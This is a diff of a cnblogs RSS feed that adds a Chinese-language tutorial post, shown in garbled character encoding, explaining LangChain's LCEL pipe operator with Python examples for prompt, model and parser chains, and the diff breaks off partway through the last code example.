@@ -3,12 +3,230 @@
     <channel>
         <title><![CDATA[ ä¸»é¡µ - åå®¢å­ ]]></title>
         <link><![CDATA[ https://www.cnblogs.com/ ]]></link>
-        <lastBuildDate>2026-05-24T09:52:05.329Z</lastBuildDate>
+        <lastBuildDate>2026-05-24T13:13:48.930Z</lastBuildDate>
         <description><![CDATA[
         ä¸»é¡µ - åå®¢å­ RSS
     ]]></description>
         <language>zh-cn</language>
         <item>
+    <title><![CDATA[ 22. LangChain LCELï¼ç¨ | ä¸²èAIçé­æ³è¯­è¨ ]]></title>
+    <link>https://www.cnblogs.com/halfcode/p/20143984</link>
+    <guid>a811683b070243396bb92db717385138</guid>
+    <description>
+    <![CDATA[ 
+            <h1 class="postTitle">
+                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/halfcode/p/20143984" title="åå¸äº 2026-05-24 19:58">
+    <span role="heading" aria-level="2">22. LangChain LCELï¼ç¨ | ä¸²èAIçé­æ³è¯­è¨</span>
+    
+
+</a>
+
+            </h1>
+            <div class="clear"></div>
+            <div class="postBody">
+                <div id="cnblogs_post_body" class="blogpost-body blogpost-body-html">
+<p>å¨ <span class="words-blog hl-git-1" data-tit="LangChain" data-pretit="langchain">LangChain çæä¸­ï¼LCELï¼LangChain Expression Languageï¼æ¯ä¸ç§æ°çç¼ç¨èå¼ãå®ç¨ä¸ä¸ªç®åç|ï¼æ¹åäº AI åºç¨çæå»ºæ¹å¼ãæ¾ç»éè¦ç¼åå¤§éè¶æ°´ä»£ç æè½ä¸²èèµ·æ¥çæç¤ºè¯ãæ¨¡ååè¾åºè§£æå¨ï¼ç°å¨åªéè¦ä¸è¡ä»£ç å°±è½å®æï¼</span></p>
+<div class="cnblogs_code">
+<pre>chain = prompt | model | parser</pre>
+</div>
+<p><strong>1. LCEL æ ¸å¿åçï¼| è¿ç®ç¬¦çç§å¯</strong><br>LCEL çæ ¸å¿è®¾è®¡å²å­¦å°±æ¯ "æ°æ®æµä¼å"ãææç»ä»¶é½éµå¾ªç»ä¸çæ¥å£ï¼æ°æ®ä»å·¦åå³æ²¿çé¾æ¡èªå¨æµå¨ï¼æ éå¼åèæå¨å¤çä¸­é´ç¶æã</p>
+<p>é¾å¼ç»åï¼LCEL ä½¿ç¨|ï¼ç«çº¿ï¼è¿ç®ç¬¦ä¸²è Promptãæ¨¡åä¸è¾åºè§£æå¨å½¢æ AI æµæ°´çº¿ï¼æ°æ®ä¸¥æ ¼æç§ä»å·¦å°å³çé¡ºåºä¼ éã</p>
+<p>åºå±å®ç°ï¼| è¿ç®ç¬¦æ¬è´¨ä¸æ¯ Python ä¸­__or__æ¹æ³çè¯­æ³ç³ã</p>
+<p>Runnable åºç±»ï¼LangChain ä¸­ææå¯æ§è¡ç»ä»¶é½ç»§æ¿èªRunnableåºç±»ï¼è¯¥åºç±»éè½½äº__or__æ¹æ³ï¼è¿å°±æ¯ä¸ºä»ä¹ææç»ä»¶é½è½ä½¿ç¨|è¿è¡é¾å¼ç»åçæ ¹æ¬åå ã</p>
+<p><img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1919157/202605/1919157-20260524195505789-1152269571.png" class="lazyload"></p>
+<p><strong>&nbsp;2. ä¸æ­¥æå»ºä½ çç¬¬ä¸æ¡ AI é¾</strong></p>
+<p>ä¸é¢ï¼è®©æä»¬ä»æç®åçä¾å­å¼å§ï¼ç¨ LCEL æå»ºä¸ä¸ªç¬è¯çæå¨ãè¿ä¸ªä¾å­å°å±ç¤º LCEL ææ ¸å¿çç¨æ³ï¼ä¸²èæç¤ºè¯ãæ¨¡åå<span class="words-blog hl-git-1" data-tit="å­ç¬¦ä¸²" data-pretit="å­ç¬¦ä¸²">å­ç¬¦ä¸²è¾åºè§£æå¨ã</span></p>
+<div class="cnblogs_code">
+<pre><span style="color: rgba(0, 0, 255, 1)">import</span><span style="color: rgba(0, 0, 0, 1)"> os
+</span><span style="color: rgba(0, 0, 255, 1)">from</span> dotenv <span style="color: rgba(0, 0, 255, 1)">import</span><span style="color: rgba(0, 0, 0, 1)"> load_dotenv
+</span><span style="color: rgba(0, 0, 255, 1)">from</span> langchain.chat_models <span style="color: rgba(0, 0, 255, 1)">import</span><span style="color: rgba(0, 0, 0, 1)"> init_chat_model
+</span><span style="color: rgba(0, 0, 255, 1)">from</span> langchain_core.prompts <span style="color: rgba(0, 0, 255, 1)">import</span><span style="color: rgba(0, 0, 0, 1)"> ChatPromptTemplate
+</span><span style="color: rgba(0, 0, 255, 1)">from</span> langchain_core.output_parsers <span style="color: rgba(0, 0, 255, 1)">import</span><span style="color: rgba(0, 0, 0, 1)"> StrOutputParser
+ 
+</span><span style="color: rgba(0, 128, 0, 1)">#</span><span style="color: rgba(0, 128, 0, 1)"> å è½½ç¯å¢åéï¼åå«APIå¯é¥ãæ¨¡ååç§°ç­ï¼</span>
+<span style="color: rgba(0, 0, 0, 1)">load_dotenv()
+ 
+</span><span style="color: rgba(0, 128, 0, 1)">#</span><span style="color: rgba(0, 128, 0, 1)"> åå§åæ¨¡åï¼ä½¿ç¨config_prefixæ¯æå¤æ¨¡åéç½®ï¼</span>
+prefix = <span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">QWEN</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">
+model </span>=<span style="color: rgba(0, 0, 0, 1)"> init_chat_model(
+    model_provider</span>=<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">openai</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">,
+    configurable_fields</span>=[<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">model</span><span style="color: rgba(128, 0, 0, 1)">"</span>, <span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">api_key</span><span style="color: rgba(128, 0, 0, 1)">"</span>, <span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">base_url</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">],
+    config_prefix</span>=<span style="color: rgba(0, 0, 0, 1)">prefix,
+    temperature</span>=0.5<span style="color: rgba(0, 0, 0, 1)">,
+    max_tokens</span>=500<span style="color: rgba(0, 0, 0, 1)">
+)
+ 
+</span><span style="color: rgba(0, 128, 0, 1)">#</span><span style="color: rgba(0, 128, 0, 1)"> æ¨¡åéç½®ï¼ä»ç¯å¢åéä¸­è¯»åï¼</span>
+config =<span style="color: rgba(0, 0, 0, 1)"> {
+    </span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">configurable</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">: {
+        f</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">{prefix}_model</span><span style="color: rgba(128, 0, 0, 1)">"</span>: os.getenv(f<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">{prefix}_MODEL</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">),
+        f</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">{prefix}_api_key</span><span style="color: rgba(128, 0, 0, 1)">"</span>: os.getenv(f<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">{prefix}_API_KEY</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">),
+        f</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">{prefix}_base_url</span><span style="color: rgba(128, 0, 0, 1)">"</span>: os.getenv(f<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">{prefix}_BASE_URL</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">)
+    }
+}
+ 
+</span><span style="color: rgba(0, 128, 0, 1)">#</span><span style="color: rgba(0, 128, 0, 1)"> åå»ºæç¤ºè¯æ¨¡æ¿</span>
+prompt =<span style="color: rgba(0, 0, 0, 1)"> ChatPromptTemplate.from_messages(
+    [
+        {</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">role</span><span style="color: rgba(128, 0, 0, 1)">"</span>: <span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">system</span><span style="color: rgba(128, 0, 0, 1)">"</span>, <span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">content</span><span style="color: rgba(128, 0, 0, 1)">"</span>: <span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">ä½ æ¯ä¸ä¸ªç¬è¯å¤§ç</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">},
+        {</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">role</span><span style="color: rgba(128, 0, 0, 1)">"</span>: <span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">user</span><span style="color: rgba(128, 0, 0, 1)">"</span>, <span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">content</span><span style="color: rgba(128, 0, 0, 1)">"</span>: <span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">{new_input}</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">}
+    ]
+)
+ 
+</span><span style="color: rgba(0, 128, 0, 1)">#</span><span style="color: rgba(0, 128, 0, 1)"> ç¨LCELæå»ºå®æ´é¾æ¡</span>
+chain = prompt | model |<span style="color: rgba(0, 0, 0, 1)"> StrOutputParser()
+ 
+</span><span style="color: rgba(0, 128, 0, 1)">#</span><span style="color: rgba(0, 128, 0, 1)"> æ§è¡é¾æ¡ï¼ä¼ å¥åå§è¾å¥</span>
+result = chain.invoke({<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">new_input</span><span style="color: rgba(128, 0, 0, 1)">"</span>: <span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">è®²ä¸ä¸ªç¬è¯</span><span style="color: rgba(128, 0, 0, 1)">"</span>}, config=<span style="color: rgba(0, 0, 0, 1)">config)
+</span><span style="color: rgba(0, 0, 255, 1)">print</span>(result)</pre>
+</div>
+<p><strong>3. è¿é¶ç¨æ³ï¼ä»ä¹å¯ä»¥å¥é¾ï¼</strong><br>LCEL çå¼ºå¤§ä¹å¤å¨äºå®çåå®¹æ§ãå ä¹ä»»ä½é»è¾é½å¯ä»¥è¢«åè£æ Runnable ç»ä»¶ï¼ç¶åæ ç¼æ¥å¥æµæ°´çº¿ãä½æä¸ä¸ªæ ¸å¿è§åå¿é¡»ç¢è®°ï¼</p>
+<p>å¥é¾çåå®¹å¿é¡»æ¯ Runnable çå­ç±»ï¼å­å¸çå¼ä¹å¿é¡»ç¬¦åè¿ä¸ªè§åã</p>
+<p>ä¸é¢æ¯ä¸åæ°æ®ç±»åçå¤çæ¹å¼å¯¹ç§è¡¨ï¼</p>
+<p>æ°æ®ç±»å	å¤çæ¹å¼	å¯¹åº Runnableå­ç±»	æ ¸å¿ä½ç¨<br>éæå¼	åè£ä¸ºlambda _: éæå¼	RunnableLambda	çæåºå®å¼<br>å½æ°/lambdaè¡¨è¾¾å¼	ç´æ¥ä½¿ç¨ï¼èªå¨è½¬æ¢ï¼	RunnableLambda	æ§è¡èªå®ä¹é»è¾<br>å¨æå¼	ä½¿ç¨RunnablePassthrough()	RunnablePassthrough	åæ ·ä¼ éæ°æ®<br>å­å¸	ç´æ¥ä½¿ç¨ï¼å¼ä¹è¦ç¬¦åè§è	RunnableParallel	å¹¶è¡æ§è¡å¤åæ¯<br>è®©æä»¬ç¨ä¸ä¸ªä¾å­æ¥æ¼ç¤ºè¿äºè§åãæä»¬å°æå»ºä¸ä¸ªè½çæç»æå JSON æ°æ®ç AI é¾ï¼è¿å¨å®éåºç¨ä¸­éå¸¸å¸¸è§ã</p>
+<p>RunnablePassthrough()ï¼å½ä½ ç´æ¥ä¼ å¥å­ç¬¦ä¸²"è¯·æè¿°ä¸ä¸å¼ ä¸..."æ¶ï¼RunnablePassthrough()ä¼å°è¿ä¸ªå­ç¬¦ä¸²åæ ·ä¼ éç»new_inputåéã</p>
+<p>lambda _: parser.get_format_instructions()ï¼è¿éçä¸åçº¿_è¡¨ç¤ºæä»¬ä¸å³å¿ä¸æ¸¸è¾å¥ï¼å ä¸ºæ ¼å¼æä»¤æ¯åºå®çãè¿ä¸ª lambda ä¼è¢«èªå¨è½¬æ¢ä¸ºRunnableLambdaã</p>
+<p>å­å¸å¥é¾ï¼æ´ä¸ªå­å¸ä¼è¢«è½¬æ¢ä¸ºRunnableParallelå¯¹è±¡ï¼å®ä¼å¹¶è¡æ§è¡ææé®å¯¹åºç Runnableï¼ç¶åå°ç»æåå¹¶ä¸ºä¸ä¸ªæ°çå­å¸ä¼ éç»ä¸ä¸ä¸ªç»ä»¶ï¼è¿éæ¯ promptï¼ã</p>
+<div class="cnblogs_code">
+<pre><span style="color: rgba(0, 0, 255, 1)">import</span><span style="color: rgba(0, 0, 0, 1)"> os
+</span><span style="color: rgba(0, 0, 255, 1)">from</span> dotenv <span style="color: rgba(0, 0, 255, 1)">import</span><span style="color: rgba(0, 0, 0, 1)"> load_dotenv
+</span><span style="color: rgba(0, 0, 255, 1)">from</span> langchain.chat_models <span style="color: rgba(0, 0, 255, 1)">import</span><span style="color: rgba(0, 0, 0, 1)"> init_chat_model
+</span><span style="color: rgba(0, 0, 255, 1)">import</span><span style="color: rgba(0, 0, 0, 1)"> asyncio
+</span><span style="color: rgba(0, 0, 255, 1)">from</span> langchain_core.prompts <span style="color: rgba(0, 0, 255, 1)">import</span><span style="color: rgba(0, 0, 0, 1)"> ChatPromptTemplate
+</span><span style="color: rgba(0, 0, 255, 1)">from</span> langchain_core.output_parsers <span style="color: rgba(0, 0, 255, 1)">import</span><span style="color: rgba(0, 0, 0, 1)"> JsonOutputParser
+</span><span style="color: rgba(0, 0, 255, 1)">from</span> langchain_core.runnables <span style="color: rgba(0, 0, 255, 1)">import</span><span style="color: rgba(0, 0, 0, 1)"> RunnablePassthrough
+ 
+load_dotenv()
+prefix </span>= <span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">QWEN</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">
+model </span>=<span style="color: rgba(0, 0, 0, 1)"> init_chat_model(
+    model_provider</span>=<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">openai</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">,
+    configurable_fields</span>=[<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">model</span><span style="color: rgba(128, 0, 0, 1)">"</span>, <span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">api_key</span><span style="color: rgba(128, 0, 0, 1)">"</span>, <span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">base_url</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">],
+    config_prefix</span>=<span style="color: rgba(0, 0, 0, 1)">prefix,
+    temperature</span>=0.5<span style="color: rgba(0, 0, 0, 1)">,
+    max_tokens</span>=500<span style="color: rgba(0, 0, 0, 1)">
+)
+config </span>=<span style="color: rgba(0, 0, 0, 1)"> {
+    </span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">configurable</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">: {
+        f</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">{prefix}_model</span><span style="color: rgba(128, 0, 0, 1)">"</span>: os.getenv(f<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">{prefix}_MODEL</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">),
+        f</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">{prefix}_api_key</span><span style="color: rgba(128, 0, 0, 1)">"</span>: os.getenv(f<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">{prefix}_API_KEY</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">),
+        f</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">{prefix}_base_url</span><span style="color: rgba(128, 0, 0, 1)">"</span>: os.getenv(f<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">{prefix}_BASE_URL</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">)
+    }
+}
+ 
+prompt </span>=<span style="color: rgba(0, 0, 0, 1)"> ChatPromptTemplate.from_messages(
+    [
+        {</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">role</span><span style="color: rgba(128, 0, 0, 1)">"</span>: <span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">system</span><span style="color: rgba(128, 0, 0, 1)">"</span>, <span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">content</span><span style="color: rgba(128, 0, 0, 1)">"</span>: <span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">ä½ æ¯ä¸ä½æ10å¹´ç»éªçèµæ·±è½¯ä»¶å·¥ç¨å¸ã{format_instructions}</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">},
+        {</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">role</span><span style="color: rgba(128, 0, 0, 1)">"</span>: <span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">user</span><span style="color: rgba(128, 0, 0, 1)">"</span>, <span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">content</span><span style="color: rgba(128, 0, 0, 1)">"</span>: <span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">{new_input}</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">}
+    ]
+)
+ 
+parser </span>=<span style="color: rgba(0, 0, 0, 1)"> JsonOutputParser()
+chain </span>=<span style="color: rgba(0, 0, 0, 1)"> (
+        {
+            </span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">new_input</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">: RunnablePassthrough(),
+            </span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">format_instructions</span><span style="color: rgba(128, 0, 0, 1)">"</span>: <span style="color: rgba(0, 0, 255, 1)">lambda</span><span style="color: rgba(0, 0, 0, 1)"> _: parser.get_format_instructions()
+        }
+        </span>|<span style="color: rgba(0, 0, 0, 1)"> prompt
+        </span>|<span style="color: rgba(0, 0, 0, 1)"> model
+        </span>|<span style="color: rgba(0, 0, 0, 1)"> parser
+)
+result </span>= chain.invoke(<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">è¯·æè¿°ä¸ä¸å¼ ä¸è¿ä¸ªäººï¼åæ¬å§åãå¹´é¾ãèä¸åå´è¶£ç±å¥½ã</span><span style="color: rgba(128, 0, 0, 1)">"</span>, config=<span style="color: rgba(0, 0, 0, 1)">config)
+</span><span style="color: rgba(0, 0, 255, 1)">print</span>(result)</pre>
+</div>
+<h4>4. å½æ°å¥é¾ï¼æ ç¼éæèªå®ä¹é»è¾</h4>
+<p>LCEL æå¼ºå¤§çç¹æ§ä¹ä¸å°±æ¯å¯ä»¥è½»æ¾å°ä»»æ Python å½æ°æ¥å¥æµæ°´çº¿ãå½æ°ä¼è¢«èªå¨è½¬æ¢ä¸ºRunnableLambdaï¼æ éä»»ä½é¢å¤çåè£ä»£ç ã</p>
+<p>è®©æä»¬æ©å±ä¸ä¸ä¸ªä¾å­ï¼æ·»å ä¸ä¸ªå½æ°å°çæç JSON æ°æ®èªå¨ä¿å­å°æ¬å°æä»¶ã</p>
+<div class="cnblogs_code">
+<pre><span style="color: rgba(0, 0, 255, 1)">import</span><span style="color: rgba(0, 0, 0, 1)"> json
+</span><span style="color: rgba(0, 0, 255, 1)">import</span><span style="color: rgba(0, 0, 0, 1)"> os
+</span><span style="color: rgba(0, 0, 255, 1)">from</span> dotenv <span style="color: rgba(0, 0, 255, 1)">import</span><span style="color: rgba(0, 0, 0, 1)"> load_dotenv
+</span><span style="color: rgba(0, 0, 255, 1)">from</span> langchain.chat_models <span style="color: rgba(0, 0, 255, 1)">import</span><span style="color: rgba(0, 0, 0, 1)"> init_chat_model
+</span><span style="color: rgba(0, 0, 255, 1)">from</span> langchain_core.prompts <span style="color: rgba(0, 0, 255, 1)">import</span><span style="color: rgba(0, 0, 0, 1)"> ChatPromptTemplate
+</span><span style="color: rgba(0, 0, 255, 1)">from</span> langchain_core.output_parsers <span style="color: rgba(0, 0, 255, 1)">import</span><span style="color: rgba(0, 0, 0, 1)"> JsonOutputParser
+</span><span style="color: rgba(0, 0, 255, 1)">from</span> langchain_core.runnables <span style="color: rgba(0, 0, 255, 1)">import</span><span style="color: rgba(0, 0, 0, 1)"> RunnablePassthrough
+ 
+load_dotenv()
+ 
+prefix </span>= <span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">QWEN</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">
+model </span>=<span style="color: rgba(0, 0, 0, 1)"> init_chat_model(
+    model_provider</span>=<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">openai</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">,
+    configurable_fields</span>=[<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">model</span><span style="color: rgba(128, 0, 0, 1)">"</span>, <span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">api_key</span><span style="color: rgba(128, 0, 0, 1)">"</span>, <span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">base_url</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">],
+    config_prefix</span>=<span style="color: rgba(0, 0, 0, 1)">prefix
+)
+ 
+config </span>=<span style="color: rgba(0, 0, 0, 1)"> {
+    </span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">configurable</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">: {
+        f</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">{prefix}_model</span><span style="color: rgba(128, 0, 0, 1)">"</span>: os.getenv(f<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">{prefix}_MODEL</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">),
+        f</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">{prefix}_api_key</span><span style="color: rgba(128, 0, 0, 1)">"</span>: os.getenv(f<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">{prefix}_API_KEY</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">),
+        f</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">{prefix}_base_url</span><span style="color: rgba(128, 0, 0, 1)">"</span>: os.getenv(f<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">{prefix}_BASE_URL</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">)
+    }
+}
+ 
+</span><span style="color: rgba(0, 128, 0, 1)">#</span><span style="color: rgba(0, 128, 0, 1)"> èªå®ä¹å½æ°ï¼ä¿å­JSONæ°æ®å°æä»¶</span>
+<span style="color: rgba(0, 0, 255, 1)">def</span> save_json(data, filename=<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">output.json</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">):
+    </span><span style="color: rgba(0, 0, 255, 1)">try</span><span style="color: rgba(0, 0, 0, 1)">:
+        with open(filename, </span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">w</span><span style="color: rgba(128, 0, 0, 1)">"</span>, encoding=<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">utf-8</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">) as f:
+            json.dump(data, f, ensure_ascii</span>=False, indent=4<span style="color: rgba(0, 0, 0, 1)">)
+        </span><span style="color: rgba(0, 0, 255, 1)">print</span>(f<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">JSONæ°æ®å·²æåä¿å­å° {filename}</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">)
+    </span><span style="color: rgba(0, 0, 255, 1)">except</span><span style="color: rgba(0, 0, 0, 1)"> Exception as e:
+        </span><span style="color: rgba(0, 0, 255, 1)">print</span>(f<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">ä¿å­JSONæä»¶æ¶åºé: {e}</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">)
+    </span><span style="color: rgba(0, 0, 255, 1)">return</span> data  <span style="color: rgba(0, 128, 0, 1)">#</span><span style="color: rgba(0, 128, 0, 1)"> éè¦ï¼è¿åæ°æ®ä»¥ä¾¿ç»§ç»­ä¼ éç»ä¸ä¸ä¸ªç»ä»¶</span>
+<span style="color: rgba(0, 0, 0, 1)"> 
+parser </span>=<span style="color: rgba(0, 0, 0, 1)"> JsonOutputParser()
+prompt </span>=<span style="color: rgba(0, 0, 0, 1)"> ChatPromptTemplate.from_messages(
+    [
+        {</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">role</span><span style="color: rgba(128, 0, 0, 1)">"</span>: <span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">system</span><span style="color: rgba(128, 0, 0, 1)">"</span>, <span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">content</span><span style="color: rgba(128, 0, 0, 1)">"</span>: <span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">ä½ æ¯ä¸ä½æ10å¹´ç»éªçèµæ·±è½¯ä»¶å·¥ç¨å¸ã{format_instructions}</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">},
+        {</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">role</span><span style="color: rgba(128, 0, 0, 1)">"</span>: <span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">user</span><span style="color: rgba(128, 0, 0, 1)">"</span>, <span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">content</span><span style="color: rgba(128, 0, 0, 1)">"</span>: <span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">{new_input}</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">}
+    ]
+)
+ 
+</span><span style="color: rgba(0, 128, 0, 1)">#</span><span style="color: rgba(0, 128, 0, 1)"> å°èªå®ä¹å½æ°ç´æ¥å å¥é¾æ¡</span>
+chain =<span style="color: rgba(0, 0, 0, 1)"> ({
+             </span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">new_input</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">: RunnablePassthrough(),
+             </span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">format_instructions</span><span style="color: rgba(128, 0, 0, 1)">"</span>: <span style="color: rgba(0, 0, 255, 1)">lambda</span><span style="color: rgba(0, 0, 0, 1)"> _: parser.get_format_instructions()
+         }
+         </span>|<span style="color: rgba(0, 0, 0, 1)"> prompt
+         </span>|<span style="color: rgba(0, 0, 0, 1)"> model
+         </span>|<span style="color: rgba(0, 0, 0, 1)"> parser
